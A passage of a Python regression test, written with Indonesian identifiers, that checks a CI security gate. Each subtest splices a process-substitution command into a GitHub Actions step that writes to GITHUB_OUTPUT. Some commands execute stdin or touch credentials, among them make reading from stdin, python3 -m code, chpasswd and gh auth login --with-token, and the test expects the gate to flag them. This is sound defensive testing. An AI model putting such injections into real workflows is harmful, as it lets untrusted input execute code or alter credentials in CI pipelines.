        sub572 = klon(tmp, "sub572")
        berkas_aksi572 = os.path.join(
            sub572, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi572, encoding="utf-8") as f:
            isi_aksi572 = f.read()
        baris_aksi572 = [b for b in isi_aksi572.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru572 = isi_aksi572.replace(
                baris_aksi572,
                baris_aksi572.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(make --file=/dev/stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru572 != isi_aksi572, \
            "suntikan aksi572 tidak menembak"
        with open(berkas_aksi572, "w", encoding="utf-8") as f:
            f.write(isi_baru572)
        rc, out = jalan(sub572, [sys.executable, GERBANG, "--semua"])
        periksa("make --file=/dev/stdin: "
                "gerbang gagal (Audit 1350)", rc != 0)
        shutil.rmtree(sub572, ignore_errors=True)
        sub573 = klon(tmp, "sub573")
        berkas_aksi573 = os.path.join(
            sub573, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi573, encoding="utf-8") as f:
            isi_aksi573 = f.read()
        baris_aksi573 = [b for b in isi_aksi573.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru573 = isi_aksi573.replace(
                baris_aksi573,
                baris_aksi573.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(aarch64-linux-gnu-gcc -x c -E -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru573 != isi_aksi573, \
            "suntikan aksi573 tidak menembak"
        with open(berkas_aksi573, "w", encoding="utf-8") as f:
            f.write(isi_baru573)
        rc, out = jalan(sub573, [sys.executable, GERBANG, "--semua"])
        periksa("aarch64-linux-gnu-gcc -x c -E -: "
                "gerbang gagal (Audit 1351)", rc != 0)
        shutil.rmtree(sub573, ignore_errors=True)
        sub574 = klon(tmp, "sub574")
        berkas_aksi574 = os.path.join(
            sub574, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi574, encoding="utf-8") as f:
            isi_aksi574 = f.read()
        baris_aksi574 = [b for b in isi_aksi574.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru574 = isi_aksi574.replace(
                baris_aksi574,
                baris_aksi574.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(as -o out.o; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru574 != isi_aksi574, \
            "suntikan aksi574 tidak menembak"
        with open(berkas_aksi574, "w", encoding="utf-8") as f:
            f.write(isi_baru574)
        rc, out = jalan(sub574, [sys.executable, GERBANG, "--semua"])
        periksa("as -o out.o: "
                "gerbang gagal (Audit 1352)", rc != 0)
        shutil.rmtree(sub574, ignore_errors=True)
        sub575 = klon(tmp, "sub575")
        berkas_aksi575 = os.path.join(
            sub575, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi575, encoding="utf-8") as f:
            isi_aksi575 = f.read()
        baris_aksi575 = [b for b in isi_aksi575.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru575 = isi_aksi575.replace(
                baris_aksi575,
                baris_aksi575.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ptar -t -f - -f arsip.tar; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru575 != isi_aksi575, \
            "suntikan aksi575 tidak menembak"
        with open(berkas_aksi575, "w", encoding="utf-8") as f:
            f.write(isi_baru575)
        rc, out = jalan(sub575, [sys.executable, GERBANG, "--semua"])
        periksa("ptar -t -f - -f arsip.tar: "
                "gerbang lolos (Audit 1353)", rc == 0)
        shutil.rmtree(sub575, ignore_errors=True)
        sub576 = klon(tmp, "sub576")
        berkas_aksi576 = os.path.join(
            sub576, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi576, encoding="utf-8") as f:
            isi_aksi576 = f.read()
        baris_aksi576 = [b for b in isi_aksi576.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru576 = isi_aksi576.replace(
                baris_aksi576,
                baris_aksi576.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tmux -S /tmp/sok load-buffer -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru576 != isi_aksi576, \
            "suntikan aksi576 tidak menembak"
        with open(berkas_aksi576, "w", encoding="utf-8") as f:
            f.write(isi_baru576)
        rc, out = jalan(sub576, [sys.executable, GERBANG, "--semua"])
        periksa("tmux -S /tmp/sok load-buffer -: "
                "gerbang gagal (Audit 1354)", rc != 0)
        shutil.rmtree(sub576, ignore_errors=True)
        sub577 = klon(tmp, "sub577")
        berkas_aksi577 = os.path.join(
            sub577, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi577, encoding="utf-8") as f:
            isi_aksi577 = f.read()
        baris_aksi577 = [b for b in isi_aksi577.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru577 = isi_aksi577.replace(
                baris_aksi577,
                baris_aksi577.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(localedef --prefix=/tmp -i- -f UTF-8 uji_XX; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru577 != isi_aksi577, \
            "suntikan aksi577 tidak menembak"
        with open(berkas_aksi577, "w", encoding="utf-8") as f:
            f.write(isi_baru577)
        rc, out = jalan(sub577, [sys.executable, GERBANG, "--semua"])
        periksa("localedef --prefix=/tmp -i- -f UTF-8 uji_XX: "
                "gerbang gagal (Audit 1355)", rc != 0)
        shutil.rmtree(sub577, ignore_errors=True)
        sub578 = klon(tmp, "sub578")
        berkas_aksi578 = os.path.join(
            sub578, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi578, encoding="utf-8") as f:
            isi_aksi578 = f.read()
        baris_aksi578 = [b for b in isi_aksi578.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru578 = isi_aksi578.replace(
                baris_aksi578,
                baris_aksi578.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree -P --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru578 != isi_aksi578, \
            "suntikan aksi578 tidak menembak"
        with open(berkas_aksi578, "w", encoding="utf-8") as f:
            f.write(isi_baru578)
        rc, out = jalan(sub578, [sys.executable, GERBANG, "--semua"])
        periksa("tree -P --fromfile: "
                "gerbang lolos (Audit 1356)", rc == 0)
        shutil.rmtree(sub578, ignore_errors=True)
        sub579 = klon(tmp, "sub579")
        berkas_aksi579 = os.path.join(
            sub579, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi579, encoding="utf-8") as f:
            isi_aksi579 = f.read()
        baris_aksi579 = [b for b in isi_aksi579.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru579 = isi_aksi579.replace(
                baris_aksi579,
                baris_aksi579.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -Rstats citra.img; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru579 != isi_aksi579, \
            "suntikan aksi579 tidak menembak"
        with open(berkas_aksi579, "w", encoding="utf-8") as f:
            f.write(isi_baru579)
        rc, out = jalan(sub579, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -Rstats citra.img: "
                "gerbang lolos (Audit 1357)", rc == 0)
        shutil.rmtree(sub579, ignore_errors=True)
        sub580 = klon(tmp, "sub580")
        berkas_aksi580 = os.path.join(
            sub580, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi580, encoding="utf-8") as f:
            isi_aksi580 = f.read()
        baris_aksi580 = [b for b in isi_aksi580.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru580 = isi_aksi580.replace(
                baris_aksi580,
                baris_aksi580.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ffmpeg -i - -f null -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru580 != isi_aksi580, \
            "suntikan aksi580 tidak menembak"
        with open(berkas_aksi580, "w", encoding="utf-8") as f:
            f.write(isi_baru580)
        rc, out = jalan(sub580, [sys.executable, GERBANG, "--semua"])
        periksa("ffmpeg -i - -f null -: "
                "gerbang gagal (Audit 1358)", rc != 0)
        shutil.rmtree(sub580, ignore_errors=True)
        sub581 = klon(tmp, "sub581")
        berkas_aksi581 = os.path.join(
            sub581, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi581, encoding="utf-8") as f:
            isi_aksi581 = f.read()
        baris_aksi581 = [b for b in isi_aksi581.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru581 = isi_aksi581.replace(
                baris_aksi581,
                baris_aksi581.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(chpasswd; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru581 != isi_aksi581, \
            "suntikan aksi581 tidak menembak"
        with open(berkas_aksi581, "w", encoding="utf-8") as f:
            f.write(isi_baru581)
        rc, out = jalan(sub581, [sys.executable, GERBANG, "--semua"])
        periksa("chpasswd: "
                "gerbang gagal (Audit 1359)", rc != 0)
        shutil.rmtree(sub581, ignore_errors=True)
        sub582 = klon(tmp, "sub582")
        berkas_aksi582 = os.path.join(
            sub582, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi582, encoding="utf-8") as f:
            isi_aksi582 = f.read()
        baris_aksi582 = [b for b in isi_aksi582.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru582 = isi_aksi582.replace(
                baris_aksi582,
                baris_aksi582.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(systemd-run --scope --on-clock-change cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru582 != isi_aksi582, \
            "suntikan aksi582 tidak menembak"
        with open(berkas_aksi582, "w", encoding="utf-8") as f:
            f.write(isi_baru582)
        rc, out = jalan(sub582, [sys.executable, GERBANG, "--semua"])
        periksa("systemd-run --scope --on-clock-change cat: "
                "gerbang lolos (Audit 1364)", rc == 0)
        shutil.rmtree(sub582, ignore_errors=True)

        sub583 = klon(tmp, "sub583")
        berkas_aksi583 = os.path.join(
            sub583, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi583, encoding="utf-8") as f:
            isi_aksi583 = f.read()
        baris_aksi583 = [b for b in isi_aksi583.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru583 = isi_aksi583.replace(
                baris_aksi583,
                baris_aksi583.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(make --file=/dev/fd/0; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru583 != isi_aksi583, \
            "suntikan aksi583 tidak menembak"
        with open(berkas_aksi583, "w", encoding="utf-8") as f:
            f.write(isi_baru583)
        rc, out = jalan(sub583, [sys.executable, GERBANG, "--semua"])
        periksa("make --file=/dev/fd/0: "
                "gerbang gagal (Audit 1365)", rc != 0)
        shutil.rmtree(sub583, ignore_errors=True)

        sub584 = klon(tmp, "sub584")
        berkas_aksi584 = os.path.join(
            sub584, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi584, encoding="utf-8") as f:
            isi_aksi584 = f.read()
        baris_aksi584 = [b for b in isi_aksi584.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru584 = isi_aksi584.replace(
                baris_aksi584,
                baris_aksi584.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tmux -V load-buffer -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru584 != isi_aksi584, \
            "suntikan aksi584 tidak menembak"
        with open(berkas_aksi584, "w", encoding="utf-8") as f:
            f.write(isi_baru584)
        rc, out = jalan(sub584, [sys.executable, GERBANG, "--semua"])
        periksa("tmux -V load-buffer -: "
                "gerbang lolos (Audit 1366)", rc == 0)
        shutil.rmtree(sub584, ignore_errors=True)

        sub585 = klon(tmp, "sub585")
        berkas_aksi585 = os.path.join(
            sub585, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi585, encoding="utf-8") as f:
            isi_aksi585 = f.read()
        baris_aksi585 = [b for b in isi_aksi585.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru585 = isi_aksi585.replace(
                baris_aksi585,
                baris_aksi585.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree -- --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru585 != isi_aksi585, \
            "suntikan aksi585 tidak menembak"
        with open(berkas_aksi585, "w", encoding="utf-8") as f:
            f.write(isi_baru585)
        rc, out = jalan(sub585, [sys.executable, GERBANG, "--semua"])
        periksa("tree -- --fromfile: "
                "gerbang lolos (Audit 1367)", rc == 0)
        shutil.rmtree(sub585, ignore_errors=True)

        sub586 = klon(tmp, "sub586")
        berkas_aksi586 = os.path.join(
            sub586, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi586, encoding="utf-8") as f:
            isi_aksi586 = f.read()
        baris_aksi586 = [b for b in isi_aksi586.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru586 = isi_aksi586.replace(
                baris_aksi586,
                baris_aksi586.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree -aP --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru586 != isi_aksi586, \
            "suntikan aksi586 tidak menembak"
        with open(berkas_aksi586, "w", encoding="utf-8") as f:
            f.write(isi_baru586)
        rc, out = jalan(sub586, [sys.executable, GERBANG, "--semua"])
        periksa("tree -aP --fromfile: "
                "gerbang lolos (Audit 1368)", rc == 0)
        shutil.rmtree(sub586, ignore_errors=True)

        sub587 = klon(tmp, "sub587")
        berkas_aksi587 = os.path.join(
            sub587, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi587, encoding="utf-8") as f:
            isi_aksi587 = f.read()
        baris_aksi587 = [b for b in isi_aksi587.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru587 = isi_aksi587.replace(
                baris_aksi587,
                baris_aksi587.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(debugfs -wf perintah.txt citra.img; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru587 != isi_aksi587, \
            "suntikan aksi587 tidak menembak"
        with open(berkas_aksi587, "w", encoding="utf-8") as f:
            f.write(isi_baru587)
        rc, out = jalan(sub587, [sys.executable, GERBANG, "--semua"])
        periksa("debugfs -wf perintah.txt citra.img: "
                "gerbang lolos (Audit 1369)", rc == 0)
        shutil.rmtree(sub587, ignore_errors=True)

        sub588 = klon(tmp, "sub588")
        berkas_aksi588 = os.path.join(
            sub588, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi588, encoding="utf-8") as f:
            isi_aksi588 = f.read()
        baris_aksi588 = [b for b in isi_aksi588.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru588 = isi_aksi588.replace(
                baris_aksi588,
                baris_aksi588.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ffprobe berkas.mp4 pipe:; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru588 != isi_aksi588, \
            "suntikan aksi588 tidak menembak"
        with open(berkas_aksi588, "w", encoding="utf-8") as f:
            f.write(isi_baru588)
        rc, out = jalan(sub588, [sys.executable, GERBANG, "--semua"])
        periksa("ffprobe berkas.mp4 pipe:: "
                "gerbang lolos (Audit 1370)", rc == 0)
        shutil.rmtree(sub588, ignore_errors=True)

        sub589 = klon(tmp, "sub589")
        berkas_aksi589 = os.path.join(
            sub589, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi589, encoding="utf-8") as f:
            isi_aksi589 = f.read()
        baris_aksi589 = [b for b in isi_aksi589.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru589 = isi_aksi589.replace(
                baris_aksi589,
                baris_aksi589.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(chpasswd berkasuji; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru589 != isi_aksi589, \
            "suntikan aksi589 tidak menembak"
        with open(berkas_aksi589, "w", encoding="utf-8") as f:
            f.write(isi_baru589)
        rc, out = jalan(sub589, [sys.executable, GERBANG, "--semua"])
        periksa("chpasswd berkasuji: "
                "gerbang gagal (Audit 1371)", rc != 0)
        shutil.rmtree(sub589, ignore_errors=True)

        sub590 = klon(tmp, "sub590")
        berkas_aksi590 = os.path.join(
            sub590, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi590, encoding="utf-8") as f:
            isi_aksi590 = f.read()
        baris_aksi590 = [b for b in isi_aksi590.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru590 = isi_aksi590.replace(
                baris_aksi590,
                baris_aksi590.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m sqlite3; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru590 != isi_aksi590, \
            "suntikan aksi590 tidak menembak"
        with open(berkas_aksi590, "w", encoding="utf-8") as f:
            f.write(isi_baru590)
        rc, out = jalan(sub590, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m sqlite3: "
                "gerbang gagal (Audit 1372)", rc != 0)
        shutil.rmtree(sub590, ignore_errors=True)

        sub591 = klon(tmp, "sub591")
        berkas_aksi591 = os.path.join(
            sub591, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi591, encoding="utf-8") as f:
            isi_aksi591 = f.read()
        baris_aksi591 = [b for b in isi_aksi591.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru591 = isi_aksi591.replace(
                baris_aksi591,
                baris_aksi591.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m tokenize; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru591 != isi_aksi591, \
            "suntikan aksi591 tidak menembak"
        with open(berkas_aksi591, "w", encoding="utf-8") as f:
            f.write(isi_baru591)
        rc, out = jalan(sub591, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m tokenize: "
                "gerbang gagal (Audit 1373)", rc != 0)
        shutil.rmtree(sub591, ignore_errors=True)

        sub592 = klon(tmp, "sub592")
        berkas_aksi592 = os.path.join(
            sub592, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi592, encoding="utf-8") as f:
            isi_aksi592 = f.read()
        baris_aksi592 = [b for b in isi_aksi592.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru592 = isi_aksi592.replace(
                baris_aksi592,
                baris_aksi592.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(python3 -m code; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru592 != isi_aksi592, \
            "suntikan aksi592 tidak menembak"
        with open(berkas_aksi592, "w", encoding="utf-8") as f:
            f.write(isi_baru592)
        rc, out = jalan(sub592, [sys.executable, GERBANG, "--semua"])
        periksa("python3 -m code: "
                "gerbang gagal (Audit 1374)", rc != 0)
        shutil.rmtree(sub592, ignore_errors=True)

        sub593 = klon(tmp, "sub593")
        berkas_aksi593 = os.path.join(
            sub593, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi593, encoding="utf-8") as f:
            isi_aksi593 = f.read()
        baris_aksi593 = [b for b in isi_aksi593.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru593 = isi_aksi593.replace(
                baris_aksi593,
                baris_aksi593.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl -d skrip.pl; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru593 != isi_aksi593, \
            "suntikan aksi593 tidak menembak"
        with open(berkas_aksi593, "w", encoding="utf-8") as f:
            f.write(isi_baru593)
        rc, out = jalan(sub593, [sys.executable, GERBANG, "--semua"])
        periksa("perl -d skrip.pl: "
                "gerbang gagal (Audit 1375)", rc != 0)
        shutil.rmtree(sub593, ignore_errors=True)

        sub594 = klon(tmp, "sub594")
        berkas_aksi594 = os.path.join(
            sub594, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi594, encoding="utf-8") as f:
            isi_aksi594 = f.read()
        baris_aksi594 = [b for b in isi_aksi594.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru594 = isi_aksi594.replace(
                baris_aksi594,
                baris_aksi594.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cpan; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru594 != isi_aksi594, \
            "suntikan aksi594 tidak menembak"
        with open(berkas_aksi594, "w", encoding="utf-8") as f:
            f.write(isi_baru594)
        rc, out = jalan(sub594, [sys.executable, GERBANG, "--semua"])
        periksa("cpan: "
                "gerbang gagal (Audit 1376)", rc != 0)
        shutil.rmtree(sub594, ignore_errors=True)

        sub595 = klon(tmp, "sub595")
        berkas_aksi595 = os.path.join(
            sub595, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi595, encoding="utf-8") as f:
            isi_aksi595 = f.read()
        baris_aksi595 = [b for b in isi_aksi595.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru595 = isi_aksi595.replace(
                baris_aksi595,
                baris_aksi595.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gh auth login --with-token; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru595 != isi_aksi595, \
            "suntikan aksi595 tidak menembak"
        with open(berkas_aksi595, "w", encoding="utf-8") as f:
            f.write(isi_baru595)
        rc, out = jalan(sub595, [sys.executable, GERBANG, "--semua"])
        periksa("gh auth login --with-token: "
                "gerbang gagal (Audit 1377)", rc != 0)
        shutil.rmtree(sub595, ignore_errors=True)

        sub596 = klon(tmp, "sub596")
        berkas_aksi596 = os.path.join(
            sub596, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi596, encoding="utf-8") as f:
            isi_aksi596 = f.read()
        baris_aksi596 = [b for b in isi_aksi596.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru596 = isi_aksi596.replace(
                baris_aksi596,
                baris_aksi596.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(utmpdump; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru596 != isi_aksi596, \
            "suntikan aksi596 tidak menembak"
        with open(berkas_aksi596, "w", encoding="utf-8") as f:
            f.write(isi_baru596)
        rc, out = jalan(sub596, [sys.executable, GERBANG, "--semua"])
        periksa("utmpdump: "
                "gerbang gagal (Audit 1378)", rc != 0)
        shutil.rmtree(sub596, ignore_errors=True)

        sub597 = klon(tmp, "sub597")
        berkas_aksi597 = os.path.join(
            sub597, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi597, encoding="utf-8") as f:
            isi_aksi597 = f.read()
        baris_aksi597 = [b for b in isi_aksi597.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru597 = isi_aksi597.replace(
                baris_aksi597,
                baris_aksi597.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree -Pa --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru597 != isi_aksi597, \
            "suntikan aksi597 tidak menembak"
        with open(berkas_aksi597, "w", encoding="utf-8") as f:
            f.write(isi_baru597)
        rc, out = jalan(sub597, [sys.executable, GERBANG, "--semua"])
        periksa("tree -Pa --fromfile: "
                "gerbang lolos (Audit 1384)", rc == 0)
        shutil.rmtree(sub597, ignore_errors=True)
        sub598 = klon(tmp, "sub598")
        berkas_aksi598 = os.path.join(
            sub598, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi598, encoding="utf-8") as f:
            isi_aksi598 = f.read()
        baris_aksi598 = [b for b in isi_aksi598.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru598 = isi_aksi598.replace(
                baris_aksi598,
                baris_aksi598.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree -aPx --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru598 != isi_aksi598, \
            "suntikan aksi598 tidak menembak"
        with open(berkas_aksi598, "w", encoding="utf-8") as f:
            f.write(isi_baru598)
        rc, out = jalan(sub598, [sys.executable, GERBANG, "--semua"])
        periksa("tree -aPx --fromfile: "
                "gerbang lolos (Audit 1384)", rc == 0)
        shutil.rmtree(sub598, ignore_errors=True)
        sub599 = klon(tmp, "sub599")
        berkas_aksi599 = os.path.join(
            sub599, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi599, encoding="utf-8") as f:
            isi_aksi599 = f.read()
        baris_aksi599 = [b for b in isi_aksi599.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru599 = isi_aksi599.replace(
                baris_aksi599,
                baris_aksi599.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tree --gitfile --fromfile; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru599 != isi_aksi599, \
            "suntikan aksi599 tidak menembak"
        with open(berkas_aksi599, "w", encoding="utf-8") as f:
            f.write(isi_baru599)
        rc, out = jalan(sub599, [sys.executable, GERBANG, "--semua"])
        periksa("tree --gitfile --fromfile: "
                "gerbang lolos (Audit 1385)", rc == 0)
        shutil.rmtree(sub599, ignore_errors=True)
        sub600 = klon(tmp, "sub600")
        berkas_aksi600 = os.path.join(
            sub600, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi600, encoding="utf-8") as f:
            isi_aksi600 = f.read()
        baris_aksi600 = [b for b in isi_aksi600.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru600 = isi_aksi600.replace(
                baris_aksi600,
                baris_aksi600.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tmux -LV load-buffer -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru600 != isi_aksi600, \
            "suntikan aksi600 tidak menembak"
        with open(berkas_aksi600, "w", encoding="utf-8") as f:
            f.write(isi_baru600)
        rc, out = jalan(sub600, [sys.executable, GERBANG, "--semua"])
        periksa("tmux -LV load-buffer -: "
                "gerbang gagal (Audit 1386)", rc != 0)
        shutil.rmtree(sub600, ignore_errors=True)
        sub601 = klon(tmp, "sub601")
        berkas_aksi601 = os.path.join(
            sub601, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi601, encoding="utf-8") as f:
            isi_aksi601 = f.read()
        baris_aksi601 = [b for b in isi_aksi601.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru601 = isi_aksi601.replace(
                baris_aksi601,
                baris_aksi601.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(tmux -2V load-buffer -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru601 != isi_aksi601, \
            "suntikan aksi601 tidak menembak"
        with open(berkas_aksi601, "w", encoding="utf-8") as f:
            f.write(isi_baru601)
        rc, out = jalan(sub601, [sys.executable, GERBANG, "--semua"])
        periksa("tmux -2V load-buffer -: "
                "gerbang lolos (Audit 1387)", rc == 0)
        shutil.rmtree(sub601, ignore_errors=True)
        sub602 = klon(tmp, "sub602")
        berkas_aksi602 = os.path.join(
            sub602, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi602, encoding="utf-8") as f:
            isi_aksi602 = f.read()
        baris_aksi602 = [b for b in isi_aksi602.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru602 = isi_aksi602.replace(
                baris_aksi602,
                baris_aksi602.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(make -f/dev/fd/0; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru602 != isi_aksi602, \
            "suntikan aksi602 tidak menembak"
        with open(berkas_aksi602, "w", encoding="utf-8") as f:
            f.write(isi_baru602)
        rc, out = jalan(sub602, [sys.executable, GERBANG, "--semua"])
        periksa("make -f/dev/fd/0: "
                "gerbang gagal (Audit 1388)", rc != 0)
        shutil.rmtree(sub602, ignore_errors=True)
        sub603 = klon(tmp, "sub603")
        berkas_aksi603 = os.path.join(
            sub603, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi603, encoding="utf-8") as f:
            isi_aksi603 = f.read()
        baris_aksi603 = [b for b in isi_aksi603.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru603 = isi_aksi603.replace(
                baris_aksi603,
                baris_aksi603.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(make -nf /dev/fd/0; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru603 != isi_aksi603, \
            "suntikan aksi603 tidak menembak"
        with open(berkas_aksi603, "w", encoding="utf-8") as f:
            f.write(isi_baru603)
        rc, out = jalan(sub603, [sys.executable, GERBANG, "--semua"])
        periksa("make -nf /dev/fd/0: "
                "gerbang gagal (Audit 1389)", rc != 0)
        shutil.rmtree(sub603, ignore_errors=True)
